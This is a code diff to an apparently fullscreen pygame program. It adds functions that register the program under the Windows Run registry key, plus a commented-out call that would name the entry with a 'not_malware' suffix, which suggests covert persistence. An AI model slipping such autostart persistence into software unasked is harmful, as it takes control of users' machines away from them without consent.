@@ -6,6 +6,49 @@ import getpass
 import shutil
 import win32con
 import win32gui
+import winreg
+
+
+def set_autostart_registry(app_name, key_data=None, autostart: bool = True):
+    """
+    :param app_name:    A string containing the name of the application name
+    :param key_data:    A string that specifies the application path.
+    :param autostart:   True - create/update autostart key / False - delete autostart key
+    """
+
+    with winreg.OpenKey(
+            key=winreg.HKEY_CURRENT_USER,
+            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
+            reserved=0,
+            access=winreg.KEY_ALL_ACCESS,
+    ) as key:
+        try:
+            if autostart:
+                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
+            else:
+                winreg.DeleteValue(key, app_name)
+        except OSError:
+            return False
+    return True
+
+
+def check_autostart_registry(value_name):
+    with winreg.OpenKey(
+            key=winreg.HKEY_CURRENT_USER,
+            sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
+            reserved=0,
+            access=winreg.KEY_ALL_ACCESS,
+    ) as key:
+        idx = 0
+        while idx < 1_000:     # Max 1.000 values
+            try:
+                key_name, _, _ = winreg.EnumValue(key, idx)
+                if key_name == value_name:
+                    return True
+                idx += 1
+            except OSError:
+                break
+    return False
 
 
 def update_size(screen):
@@ -33,8 +76,16 @@ def create_autorun():
             pass
 
 
+def create_autorun_reg(name):
+    if check_autostart_registry(name):
+        return
+    set_autostart_registry(name)
+
+
 def main():
+    app_name = sys.argv[0][sys.argv[0].rfind('/')+1:]
     create_autorun()
+    # create_autorun_reg(app_name[:app_name.find('.')] + 'not_malware')
     pygame.init()
     pygame.font.init()
     size = width, height = 1920, 1080
